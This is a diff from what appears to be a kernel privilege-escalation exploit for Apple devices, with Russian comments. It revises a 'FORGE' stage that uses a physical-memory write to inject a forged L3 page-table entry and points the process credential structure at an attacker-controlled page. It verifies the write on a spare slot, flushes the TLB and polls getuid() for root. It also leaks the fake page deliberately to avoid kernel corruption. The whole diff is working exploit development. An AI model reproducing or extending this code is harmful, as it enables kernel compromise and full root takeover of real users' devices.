@@ -8020,15 +8020,40 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     kpNote(r, [NSString stringWithFormat:@"  [FORGE] fkPA=%#llx pteSrc=%#018llx", (unsigned long long)fkPA, (unsigned long long)pteSrc]);
                     if (fkPA && (pteSrc & 0x3) == 0x3) {
                         uint64_t newPTE = (fkPA & 0x0000ffffffffc000ULL) | (pteSrc & ~0x0000ffffffffc000ULL);
-                        BOOL wOK = kpPhysWrite8v2(svc, tsdV, ttM, isTable, tpage, tidx * 8, newPTE, r);
-                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] L3[%u] = %#018llx — инжекция: %@", tidx, (unsigned long long)newPTE, wOK ? @"ЗАПИСАНО" : @"МИМО"]);
-                        // TLB-прогон: массовые kread'ы вымывают старую трансляцию ucredVA
-                        for (int ev = 0; ev < 3; ev++) {
-                            for (uint64_t pg = kconstant(base); pg < kconstant(base) + 0x2000000ULL; pg += 0x4000) (void)early_kread64(pg);
-                            usleep(100000);
+                        // 1.9.262 ШАГ 1 — fresh-slot верификация (write работает?):
+                        // ищем в той же 32MB-ветке L3 VA с тремя нулевыми страницами
+                        // подряд (почти наверняка немапнутый), пишем newPTE туда и
+                        // сразу читаем: TLB-записи у него нет и не было — если контент
+                        // совпал с подделкой, сама L3-запись ДОКАЗАНА.
+                        uint64_t testVA = 0; uint32_t tidx2 = 0;
+                        for (uint32_t k = 1; k <= 16 && !testVA; k++) {
+                            uint64_t cand = pageVA + (uint64_t)k * 0x4000;
+                            if ((cand ^ pageVA) & ~0x1ffffffULL) break;   // вне 32MB-ветки L3
+                            if (early_kread64(cand + 0x100) == 0 && early_kread64(cand + 0x1000) == 0 && early_kread64(cand + 0x2000) == 0) {
+                                testVA = cand; tidx2 = (uint32_t)((cand >> 14) & 0x7ff);
+                            }
                         }
-                        uid_t gu = getuid(); gid_t gg = getgid();
-                        uint32_t cru = (uint32_t)early_kread64(ucF + 0x18);
+                        if (testVA) {
+                            (void)kpPhysWrite8v2(svc, tsdV, ttM, isTable, tpage, tidx2 * 8, newPTE, r);
+                            uint32_t v18 = (uint32_t)early_kread64(testVA + uoff + 0x18);
+                            uint64_t v0 = early_kread64(testVA), o0 = early_kread64(pageVA);
+                            kpNote(r, [NSString stringWithFormat:@"  [FORGE] fresh-slot: testVA=%#llx uid=%u head=%#018llx (ориг %#018llx) — %@",
+                                      (unsigned long long)testVA, v18, v0, o0,
+                                      (v18 == 0 && v0 == o0) ? @"L3-ЗАПИСЬ РАБОТАЕТ ✓" : @"НЕ СОШЛОСЬ"]);
+                        } else {
+                            kpNote(r, @"  [FORGE] свободного слота в ветке L3 не нашлось — верификация пропущена");
+                        }
+                        // ШАГ 2 — боевой слот + TLB-прогон ПО РЕГИОНУ ucredVA (не text!)
+                        BOOL wOK = kpPhysWrite8v2(svc, tsdV, ttM, isTable, tpage, tidx * 8, newPTE, r);
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] L3[%u] = %#018llx — инжекция: %@, TLB-прогон по zone-map…",
+                                  tidx, (unsigned long long)newPTE, wOK ? @"ЗАПИСАНО" : @"МИМО"]);
+                        uid_t gu = 501; gid_t gg = 501; uint32_t cru = 501;
+                        for (int ev = 0; ev < 6 && gu != 0; ev++) {
+                            for (uint64_t pg = pageVA - 0x4000000ULL; pg < pageVA + 0x4000000ULL; pg += 0x4000) (void)early_kread64(pg);
+                            usleep(200000);
+                            gu = getuid(); gg = getgid(); cru = (uint32_t)early_kread64(ucF + 0x18);
+                            kpNote(r, [NSString stringWithFormat:@"  [FORGE] ev#%d: getuid()=%u cr_uid=%u", ev, gu, cru]);
+                        }
                         uint64_t lbl = early_kread64(ucF + 0x78);
                         kpNote(r, [NSString stringWithFormat:@"  [FORGE] getuid()=%u getgid()=%u | cr_uid=%u cr_label=%#llx",
                                   gu, gg, cru, (unsigned long long)lbl]);
@@ -8042,7 +8067,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     } else {
                         kpNote(r, @"  [FORGE] fkPA/pteSrc не сошлись — инжекции нет");
                     }
-                    free(fk);
+                    // 1.9.262: fk НЕ освобождаем (сознательный leak) — ucredVA теперь
+                    // указывает на эту страницу через L3; free() дал бы ядро читать
+                    // переиспользованную память как ucred (dangling → коррупция).
+                    (void)fk;
                 }
                 // ДВЕ валидации PA перед любой записью: (1) phystokv(pagePA) читается
                 // и первый qword совпадает с [pageVA]; (2) uid-поле == getuid().
